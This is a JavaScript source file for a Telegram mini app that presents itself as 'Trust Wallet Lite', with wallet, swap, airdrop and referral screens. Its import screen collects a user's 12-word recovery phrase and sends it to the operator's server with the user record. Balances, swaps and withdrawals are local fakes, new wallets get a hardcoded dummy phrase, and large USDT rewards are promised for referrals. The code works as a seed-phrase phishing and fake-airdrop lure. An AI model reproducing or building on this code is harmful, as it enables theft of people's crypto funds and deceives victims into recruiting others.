// ============================================================================
// TRUST WALLET LITE - V4.0 (FULLY WORKING)
// All sensitive data is on Render, not in this file
// ============================================================================

// ====== 1. TELEGRAM INIT ======
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
    console.log("✅ Telegram WebApp ready");
}

// Get referral param
const startParam = tg?.initDataUnsafe?.start_param || 
                   new URLSearchParams(window.location.search).get('startapp');

// ====== 2. STATE ======
let userData = null;
let isAdmin = false;
let currentLanguage = localStorage.getItem('language') || 'en';
let currentTheme = localStorage.getItem('theme') || 'light';
let currentPage = 'wallet';
let TWT_PRICE = 1.25;
let livePrices = {};
let adminId = null;

// ====== 3. CONSTANTS ======
const AIRDROP_BONUS = 10;
const REFERRAL_BONUS = 25;
const SWAP_FEE_PERCENT = 0.003;
const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";

const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'ADA', name: 'Cardano' },
    { symbol: 'DOGE', name: 'Dogecoin' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' },
    { symbol: 'TON', name: 'Toncoin' }
];

const AIRDROP_MILESTONES = [
    { invites: 5, reward: 25, unit: 'USDT', icon: 'fa-star' },
    { invites: 10, reward: 50, unit: 'USDT', icon: 'fa-medal' },
    { invites: 25, reward: 120, unit: 'USDT', icon: 'fa-medal' },
    { invites: 50, reward: 250, unit: 'USDT', icon: 'fa-crown' },
    { invites: 100, reward: 500, unit: 'USDT', icon: 'fa-crown' },
    { invites: 250, reward: 1000, unit: 'USDT', icon: 'fa-gem' },
    { invites: 500, reward: 2500, unit: 'USDT', icon: 'fa-gem' },
    { invites: 1000, reward: 5000, unit: 'USDT', icon: 'fa-diamond' }
];

const WITHDRAW_FEES = {
    TWT: 1, USDT: 0.16, BNB: 0.0005, BTC: 0.0002, ETH: 0.001,
    SOL: 0.005, TRX: 1, ADA: 0.5, DOGE: 1, SHIB: 50000, PEPE: 500000, TON: 0.1
};

const WITHDRAW_MINIMUMS = {
    TWT: 10, USDT: 10, BNB: 0.02, BTC: 0.0005, ETH: 0.005,
    SOL: 0.12, TRX: 40, ADA: 10, DOGE: 50, SHIB: 500000, PEPE: 5000000, TON: 1
};

const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png',
    ADA: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
    DOGE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
    SHIB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5994.png',
    PEPE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/24478.png',
    TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
};

const CRYPTO_IDS = {
    TWT: 'trust-wallet-token', USDT: 'tether', BNB: 'binancecoin',
    BTC: 'bitcoin', ETH: 'ethereum', SOL: 'solana', TRX: 'tron',
    ADA: 'cardano', DOGE: 'dogecoin', SHIB: 'shiba-inu',
    PEPE: 'pepe', TON: 'the-open-network'
};

const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '✨', '🌟', '⭐', '🔥', '⚡', '💎', '🔔', '🎁', '🎈', '🎉', '🎊', '👑', '🚀', '💫'];

// ====== 4. TRANSLATIONS ======
const translations = {
    en: {
        'nav.wallet': 'Wallet', 'nav.swap': 'Swap', 'nav.airdrop': 'Airdrop',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'Settings',
        'actions.send': 'Send', 'actions.receive': 'Receive', 'actions.deposit': 'Deposit',
        'actions.withdraw': 'Withdraw', 'actions.history': 'History',
        'wallet.totalBalance': 'Total Balance',
        'swap.from': 'From', 'swap.to': 'To', 'swap.confirm': 'Confirm Swap',
        'airdrop.totalInvites': 'Total Invites', 'airdrop.earned': 'USDT Earned',
        'airdrop.yourLink': 'Your Invite Link', 'airdrop.milestones': 'Airdrop Milestones',
        'settings.language': 'Language', 'settings.theme': 'Theme',
        'settings.logout': 'Logout'
    },
    ar: {
        'nav.wallet': 'المحفظة', 'nav.swap': 'تحويل', 'nav.airdrop': 'الإسقاط الجوي',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'الإعدادات',
        'actions.send': 'إرسال', 'actions.receive': 'استلام', 'actions.deposit': 'إيداع',
        'actions.withdraw': 'سحب', 'actions.history': 'السجل',
        'wallet.totalBalance': 'الرصيد الإجمالي',
        'swap.from': 'من', 'swap.to': 'إلى', 'swap.confirm': 'تأكيد',
        'airdrop.totalInvites': 'إجمالي الدعوات', 'airdrop.earned': 'USDT المكتسبة',
        'airdrop.yourLink': 'رابط الدعوة', 'airdrop.milestones': 'مراحل الإسقاط',
        'settings.language': 'اللغة', 'settings.theme': 'المظهر',
        'settings.logout': 'تسجيل الخروج'
    }
};

function t(key) {
    return translations[currentLanguage]?.[key] || translations.en[key] || key;
}

function toggleLanguage() {
    currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
    localStorage.setItem('language', currentLanguage);
    document.getElementById('currentLanguageFlag').textContent = currentLanguage === 'en' ? '🇬🇧' : '🇸🇦';
    if (currentLanguage === 'ar') {
        document.body.classList.add('rtl');
        document.documentElement.dir = 'rtl';
    } else {
        document.body.classList.remove('rtl');
        document.documentElement.dir = 'ltr';
    }
    location.reload();
}

function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    localStorage.setItem('theme', currentTheme);
    document.documentElement.setAttribute('data-theme', currentTheme);
    document.querySelector('#themeBtn i').className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

function initTheme() {
    document.documentElement.setAttribute('data-theme', currentTheme);
}

// ====== 5. UTILITIES ======
function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

function formatBalance(balance, symbol) {
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    if (symbol === 'BTC') return balance.toFixed(6) + ' BTC';
    if (['BNB', 'ETH', 'SOL', 'TRX', 'ADA', 'TON'].includes(symbol)) return balance.toFixed(4) + ' ' + symbol;
    return balance.toLocaleString() + ' ' + symbol;
}

function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
    return num.toFixed(2);
}

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    toast.querySelector('#toastMessage').textContent = message;
    toast.classList.remove('hidden');
    setTimeout(() => toast.classList.add('hidden'), 3000);
}

function closeModal(id) {
    document.getElementById(id).classList.remove('show');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast('Copied!');
}

// ====== 6. API CALLS ======
async function loadConfig() {
    try {
        const res = await fetch('/api/config');
        const config = await res.json();
        adminId = config.adminId;
        return config;
    } catch(e) { return null; }
}

async function createUserOnServer(userId, data) {
    try {
        await fetch('/api/create-user', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, userData: data })
        });
        return true;
    } catch(e) { return false; }
}

async function updateUserOnServer(userId, updates) {
    try {
        await fetch('/api/update-user', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, updates })
        });
        return true;
    } catch(e) { return false; }
}

async function createDepositAddress(userId, currency) {
    try {
        const res = await fetch('/api/create-deposit-address', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, currency })
        });
        const data = await res.json();
        return data.address || `0x${userId.slice(-40)}`;
    } catch(e) { return `0x${userId.slice(-40)}`; }
}

// ====== 7. PRICES ======
async function fetchLivePrices() {
    try {
        const ids = Object.values(CRYPTO_IDS).join(',');
        const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
        const data = await res.json();
        for (const [symbol, id] of Object.entries(CRYPTO_IDS)) {
            if (data[id]) livePrices[symbol] = { price: data[id].usd };
        }
        if (!livePrices.TWT) livePrices.TWT = { price: 1.25 };
        TWT_PRICE = livePrices.TWT.price;
        if (currentPage === 'wallet') renderAssets();
        updateTotalBalance();
    } catch(e) { console.error(e); }
}

function refreshPrices() { fetchLivePrices(); showToast('Prices refreshed!'); }

// ====== 8. USER DATA ======
function getUserId() { return localStorage.getItem('twt_user_id'); }

function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userData.userId}`, JSON.stringify(userData));
        updateUserOnServer(userData.userId, userData);
    }
}

function loadUserData() {
    const userId = getUserId();
    if (!userId) return false;
    const saved = localStorage.getItem(`user_${userId}`);
    if (saved) {
        userData = JSON.parse(saved);
        isAdmin = (userId === adminId);
        return true;
    }
    return false;
}

function updateTotalBalance() {
    if (!userData) return;
    let total = userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * TWT_PRICE;
    document.getElementById('totalBalance').textContent = '$' + total.toFixed(2);
}

function addTransaction(tx) {
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({ ...tx, timestamp: new Date().toISOString() });
    saveUserData();
}

// ====== 9. ONBOARDING ======
function showMainApp() {
    document.getElementById('onboardingScreen').style.display = 'none';
    document.getElementById('mainContent').style.display = 'block';
    showWallet();
}

function showOnboarding() {
    document.getElementById('onboardingScreen').style.display = 'flex';
    document.getElementById('mainContent').style.display = 'none';
}

async function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    
    try {
        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', newUserId);
        
        const newUserData = {
            userId: newUserId,
            userName: 'User',
            referralCode: newUserId.slice(-8).toUpperCase(),
            balances: { TWT: 0, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0 },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT' }],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString(),
            recoveryPhrase: ['apple', 'banana', 'cherry', 'dragon', 'eagle', 'forest', 'green', 'happy', 'island', 'jungle', 'king', 'light'].join(' ')
        };
        
        await createUserOnServer(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        isAdmin = (newUserId === adminId);
        
        if (startParam) {
            await fetch('/api/process-invite', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ inviterId: startParam, newUserId })
            });
        }
        
        showMainApp();
        renderWallet();
        updateTotalBalance();
        showToast('✅ Wallet created! +10 USDT');
    } catch(e) { showToast('Failed', 'error'); }
    finally { btn.innerHTML = 'Create a new wallet'; btn.disabled = false; }
}

function showImportModal() {
    const grid = document.getElementById('wordsGrid');
    grid.innerHTML = '';
    for (let i = 1; i <= 12; i++) {
        grid.innerHTML += `<div class="word-field"><div class="word-label">${i}</div><input type="text" id="word_${i}" class="word-input" placeholder="word ${i}"></div>`;
    }
    document.getElementById('importModal').classList.add('show');
}

async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) { showToast(`Enter word ${i}`, 'error'); return; }
        words.push(word);
    }
    
    const btn = document.getElementById('confirmImportBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
    btn.disabled = true;
    
    try {
        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', newUserId);
        
        const newUserData = {
            userId: newUserId,
            userName: 'User',
            recoveryPhrase: words.join(' '),
            referralCode: newUserId.slice(-8).toUpperCase(),
            balances: { TWT: 0, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0 },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT' }],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        await createUserOnServer(newUserId, newUserData);
        userData = newUserData;
        saveUserData();
        isAdmin = (newUserId === adminId);
        
        closeModal('importModal');
        showMainApp();
        renderWallet();
        updateTotalBalance();
        showToast('✅ Wallet imported! +10 USDT');
    } catch(e) { showToast('Failed', 'error'); }
    finally { btn.innerHTML = 'Import Wallet'; btn.disabled = false; }
}

// ====== 10. WALLET ======
function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container || !userData) return;
    
    container.innerHTML = ALL_ASSETS.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'TWT' ? TWT_PRICE : 0);
        const value = asset.symbol === 'USDT' ? balance : balance * price;
        return `
            <div class="asset-item">
                <div class="asset-left">
                    <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img">
                    <div class="asset-info"><h4>${asset.name}</h4><p>${asset.symbol}</p></div>
                </div>
                <div class="asset-right">
                    <div class="asset-balance">${formatBalance(balance, asset.symbol)}</div>
                    <div class="asset-value">$${formatNumber(value)}</div>
                </div>
            </div>
        `;
    }).join('');
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    container.innerHTML = `
        <div class="balance-card"><div class="total-balance" id="totalBalance">$0</div></div>
        <div class="action-buttons">
            <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>${t('actions.deposit')}</span></button>
            <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>${t('actions.withdraw')}</span></button>
            <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>${t('actions.send')}</span></button>
            <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>${t('actions.receive')}</span></button>
            <button class="action-btn" onclick="showHistory()"><i class="fas fa-history"></i><span>${t('actions.history')}</span></button>
        </div>
        <div id="assetsList" class="assets-list"></div>
    `;
    renderAssets();
    updateTotalBalance();
}

// ====== 11. SWAP ======
let swapFrom = 'TWT', swapTo = 'USDT';

function renderSwap() {
    document.getElementById('swapContainer').innerHTML = `
        <div class="swap-container">
            <div class="swap-box"><div class="swap-label">${t('swap.from')}</div><div class="swap-row"><input type="number" id="swapAmount" placeholder="0" oninput="calcSwap()"><select id="swapFromSelect" onchange="calcSwap()">${ALL_ASSETS.map(a => `<option value="${a.symbol}" ${a.symbol === swapFrom ? 'selected' : ''}>${a.symbol}</option>`).join('')}</select></div><div class="balance-hint">Balance: <span id="fromBalance">0</span></div></div>
            <div class="swap-arrow" onclick="swapDirection()"><i class="fas fa-arrow-down"></i></div>
            <div class="swap-box"><div class="swap-label">${t('swap.to')}</div><div class="swap-row"><input type="number" id="swapResult" placeholder="0" readonly><select id="swapToSelect" onchange="calcSwap()">${ALL_ASSETS.map(a => `<option value="${a.symbol}" ${a.symbol === swapTo ? 'selected' : ''}>${a.symbol}</option>`).join('')}</select></div><div class="balance-hint">Balance: <span id="toBalance">0</span></div></div>
            <button class="btn-primary" onclick="confirmSwap()">${t('swap.confirm')}</button>
        </div>
    `;
    updateSwapBalances();
}

function updateSwapBalances() {
    if (!userData) return;
    document.getElementById('fromBalance').innerText = userData.balances[swapFrom] || 0;
    document.getElementById('toBalance').innerText = userData.balances[swapTo] || 0;
}

function calcSwap() {
    const amount = parseFloat(document.getElementById('swapAmount').value) || 0;
    swapFrom = document.getElementById('swapFromSelect').value;
    swapTo = document.getElementById('swapToSelect').value;
    let fromPrice = swapFrom === 'TWT' ? TWT_PRICE : (livePrices[swapFrom]?.price || 0);
    let toPrice = swapTo === 'TWT' ? TWT_PRICE : (livePrices[swapTo]?.price || 0);
    if (fromPrice > 0 && toPrice > 0) {
        document.getElementById('swapResult').value = ((amount * fromPrice) / toPrice).toFixed(6);
    }
}

function swapDirection() {
    const fromSelect = document.getElementById('swapFromSelect');
    const toSelect = document.getElementById('swapToSelect');
    const temp = fromSelect.value;
    fromSelect.value = toSelect.value;
    toSelect.value = temp;
    calcSwap();
}

function confirmSwap() {
    const amount = parseFloat(document.getElementById('swapAmount').value);
    if (!amount || amount <= 0) { showToast('Enter amount', 'error'); return; }
    if ((userData.balances[swapFrom] || 0) < amount) { showToast('Insufficient balance', 'error'); return; }
    
    const toAmount = parseFloat(document.getElementById('swapResult').value);
    userData.balances[swapFrom] -= amount;
    userData.balances[swapTo] = (userData.balances[swapTo] || 0) + toAmount;
    saveUserData();
    updateSwapBalances();
    renderAssets();
    updateTotalBalance();
    document.getElementById('swapAmount').value = '';
    calcSwap();
    showToast('Swap completed!');
}

// ====== 12. DEPOSIT/WITHDRAW/SEND/RECEIVE ======
async function showDepositModal() {
    document.getElementById('depositModal').classList.add('show');
    const currency = document.getElementById('depositCurrency').value;
    const address = await createDepositAddress(userData.userId, currency);
    document.getElementById('depositAddress').innerText = address;
    document.getElementById('depositMinAmount').innerText = WITHDRAW_MINIMUMS[currency] || 10;
}

function copyDepositAddress() { copyToClipboard(document.getElementById('depositAddress').innerText); }

function showWithdrawModal() { document.getElementById('withdrawModal').classList.add('show'); updateWithdrawInfo(); }
function updateWithdrawInfo() {
    const c = document.getElementById('withdrawCurrency').value;
    document.getElementById('withdrawMinAmount').innerText = WITHDRAW_MINIMUMS[c] || 10;
    document.getElementById('withdrawFee').innerText = (WITHDRAW_FEES[c] || 1) + ' ' + c;
}
function submitWithdraw() {
    const c = document.getElementById('withdrawCurrency').value;
    const a = parseFloat(document.getElementById('withdrawAmount').value);
    const addr = document.getElementById('withdrawAddress').value;
    if (!a || a <= 0 || !addr) { showToast('Fill all fields', 'error'); return; }
    if ((userData.balances[c] || 0) < a + (WITHDRAW_FEES[c] || 1)) { showToast('Insufficient balance', 'error'); return; }
    userData.balances[c] -= a + (WITHDRAW_FEES[c] || 1);
    addTransaction({ type: 'withdraw', amount: a, currency: c, address: addr });
    saveUserData();
    renderAssets();
    updateTotalBalance();
    closeModal('withdrawModal');
    showToast(`Withdrawal request for ${a} ${c} submitted`);
}

function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
function sendTransaction() {
    const c = document.getElementById('sendCurrency').value;
    const a = parseFloat(document.getElementById('sendAmount').value);
    const addr = document.getElementById('sendAddress').value;
    if (!a || a <= 0 || !addr) { showToast('Fill all fields', 'error'); return; }
    if ((userData.balances[c] || 0) < a) { showToast('Insufficient balance', 'error'); return; }
    userData.balances[c] -= a;
    addTransaction({ type: 'send', amount: a, currency: c, to: addr });
    saveUserData();
    renderAssets();
    updateTotalBalance();
    closeModal('sendModal');
    showToast(`Sent ${a} ${c}`);
}

function showReceiveModal() {
    document.getElementById('receiveModal').classList.add('show');
    document.getElementById('receiveAddress').innerText = userData.userId;
}
function copyAddress() { copyToClipboard(document.getElementById('receiveAddress').innerText); }

// ====== 13. AIRDROP ======
function renderAirdrop() {
    document.getElementById('referralContainer').innerHTML = `
        <div class="referral-stats"><div class="stat-card"><span>${t('airdrop.totalInvites')}</span><span id="totalInvites">0</span></div><div class="stat-card"><span>${t('airdrop.earned')}</span><span id="usdtEarned">0</span></div></div>
        <div class="referral-link-card"><div class="link-container"><input type="text" id="inviteLink" readonly><button class="copy-btn" onclick="copyInviteLink()"><i class="fas fa-copy"></i></button></div></div>
        <div id="milestonesList"></div>
    `;
    updateAirdropStats();
    renderMilestones();
}

function updateAirdropStats() {
    if (!userData) return;
    document.getElementById('totalInvites').innerText = userData.inviteCount || 0;
    document.getElementById('usdtEarned').innerText = (userData.totalUsdtEarned || 0).toFixed(2);
    document.getElementById('inviteLink').value = `${BOT_LINK}?startapp=${userData.referralCode}`;
}

function renderMilestones() {
    const container = document.getElementById('milestonesList');
    if (!container || !userData) return;
    container.innerHTML = AIRDROP_MILESTONES.map(m => {
        const progress = Math.min((userData.inviteCount / m.invites) * 100, 100);
        const canClaim = userData.inviteCount >= m.invites && !userData.airdropMilestones.find(x => x.invites === m.invites)?.claimed;
        return `<div class="milestone-item"><div class="milestone-header"><span>${m.invites} Invites</span><span>${m.reward} ${m.unit}</span></div><div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div>${canClaim ? `<button class="claim-btn" onclick="claimMilestone(${m.invites})">Claim</button>` : ''}</div>`;
    }).join('');
}

function claimMilestone(invites) {
    const m = userData.airdropMilestones.find(x => x.invites === invites);
    if (!m || m.claimed) return;
    if (userData.inviteCount < invites) { showToast(`Need ${invites} invites`, 'error'); return; }
    const reward = AIRDROP_MILESTONES.find(x => x.invites === invites).reward;
    userData.balances.USDT += reward;
    userData.totalUsdtEarned += reward;
    m.claimed = true;
    addTransaction({ type: 'milestone', amount: reward, currency: 'USDT' });
    saveUserData();
    updateAirdropStats();
    renderMilestones();
    renderAssets();
    updateTotalBalance();
    showToast(`Claimed ${reward} USDT!`);
}

function copyInviteLink() { copyToClipboard(`${BOT_LINK}?startapp=${userData?.referralCode}`); }

// ====== 14. TWT PAY ======
function renderTWTPay() {
    const bal = userData?.balances?.TWT || 0;
    document.getElementById('twtpayContainer').innerHTML = `
        <div class="virtual-card"><div class="card-chip"><i class="fas fa-microchip"></i></div><div class="card-brand">TWT Pay</div><div class="card-number"><span>****</span><span>****</span><span>****</span><span>${userData?.userId?.slice(-4) || '0000'}</span></div><div class="card-balance"><div>Card Balance</div><div class="balance-value">${bal} TWT</div><div>≈ $${(bal * TWT_PRICE).toFixed(2)}</div></div></div>
        <div class="card-actions"><button class="card-action-btn" onclick="showTopUp()"><i class="fas fa-plus"></i><span>Top Up</span></button></div>
    `;
}
function showTopUp() { showToast('Coming soon!'); }

// ====== 15. SETTINGS ======
function renderSettings() {
    document.getElementById('settingsContainer').innerHTML = `
        <div class="settings-list">
            <div class="settings-item" onclick="showHistory()"><i class="fas fa-history"></i><div><div class="label">${t('actions.history')}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleLanguage()"><i class="fas fa-language"></i><div><div class="label">${t('settings.language')}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleTheme()"><i class="fas fa-moon"></i><div><div class="label">${t('settings.theme')}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">${t('settings.logout')}</div></div></div>
        </div>
    `;
}

function showHistory() {
    const modal = document.getElementById('historyModal');
    const list = document.getElementById('historyList');
    const txs = userData?.transactions || [];
    list.innerHTML = txs.length ? txs.map(tx => `<div class="history-item"><div>${tx.type}</div><div>${tx.amount} ${tx.currency}</div><div>${new Date(tx.timestamp).toLocaleDateString()}</div></div>`).join('') : '<div style="text-align:center;padding:20px;">No transactions</div>';
    modal.classList.add('show');
}

function logout() {
    if (confirm('Logout?')) { localStorage.clear(); location.reload(); }
}

// ====== 16. ADMIN ======
function showAdminPanel() {
    if (!isAdmin) { showToast('Access denied', 'error'); return; }
    document.getElementById('adminPanel').classList.remove('hidden');
    document.getElementById('adminContent').innerHTML = '<div>Admin Panel - User ID: ' + userData?.userId + '</div>';
}
function closeAdminPanel() { document.getElementById('adminPanel').classList.add('hidden'); }

// ====== 17. NAVIGATION ======
function showWallet() { currentPage = 'wallet'; updateTabs(); renderWallet(); }
function showSwap() { currentPage = 'swap'; updateTabs(); renderSwap(); }
function showAirdrop() { currentPage = 'airdrop'; updateTabs(); renderAirdrop(); }
function showTWTPay() { currentPage = 'twtpay'; updateTabs(); renderTWTPay(); }
function showSettings() { currentPage = 'settings'; updateTabs(); renderSettings(); }

function updateTabs() {
    ['walletSection', 'swapSection', 'referralSection', 'twtpaySection', 'settingsSection'].forEach(s => document.getElementById(s).classList.add('hidden'));
    document.getElementById(`${currentPage === 'airdrop' ? 'referralSection' : currentPage + 'Section'}`).classList.remove('hidden');
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.querySelector(`.nav-item[data-tab="${currentPage === 'airdrop' ? 'referral' : currentPage}"]`).classList.add('active');
}

// ====== 18. INIT ======
document.addEventListener('DOMContentLoaded', async () => {
    initTheme();
    await loadConfig();
    
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'swap') showSwap();
            else if (tab === 'referral') showAirdrop();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    
    document.getElementById('createWalletBtn').onclick = createNewWallet;
    document.getElementById('importWalletBtn').onclick = showImportModal;
    document.getElementById('confirmImportBtn').onclick = importWallet;
    
    await fetchLivePrices();
    
    if (loadUserData()) {
        showMainApp();
        renderWallet();
    } else {
        showOnboarding();
    }
    
    setTimeout(() => document.getElementById('splashScreen').classList.add('hidden'), 1500);
});

// ====== 19. EXPOSE GLOBALS ======
window.showWallet = showWallet;
window.showSwap = showSwap;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.closeModal = closeModal;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.sendTransaction = sendTransaction;
window.submitWithdraw = submitWithdraw;
window.copyAddress = copyAddress;
window.copyDepositAddress = copyDepositAddress;
window.copyInviteLink = copyInviteLink;
window.claimMilestone = claimMilestone;
window.showHistory = showHistory;
window.showAdminPanel = showAdminPanel;
window.closeAdminPanel = closeAdminPanel;
window.refreshPrices = refreshPrices;
window.calcSwap = calcSwap;
window.confirmSwap = confirmSwap;
window.swapDirection = swapDirection;
window.showTopUp = showTopUp;
window.logout = logout;
window.toggleLanguage = toggleLanguage;
window.toggleTheme = toggleTheme;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.showImportModal = showImportModal;
